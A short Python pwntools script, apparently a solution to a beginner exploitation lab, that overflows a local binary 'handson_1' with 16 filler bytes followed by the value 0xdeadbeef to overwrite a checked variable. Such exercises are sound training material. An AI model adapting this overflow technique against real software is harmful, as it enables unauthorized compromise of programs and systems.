from pwn import *


target = process('./handson_1')

secret = 0xdeadbeef

payload = b"A" * 16
payload += p32(secret)

target.sendline(payload)

print(target.recvline())

# target.interactive()
    

